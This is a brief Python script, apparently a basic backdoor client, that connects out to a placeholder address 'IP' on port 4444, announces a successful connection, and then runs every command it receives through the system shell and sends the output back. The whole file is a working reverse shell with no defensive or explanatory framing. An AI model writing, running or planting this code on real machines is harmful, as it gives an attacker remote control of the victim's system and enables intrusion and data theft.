import socket
import subprocess


def run_system_commands(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("IP", 4444))
connection.send(b"[+] Connection Successful\n\n")

while True:
    command = connection.recv(1024).decode("UTF-8")
    command_result = run_system_commands(command)
    connection.send(command_result)

connection.close()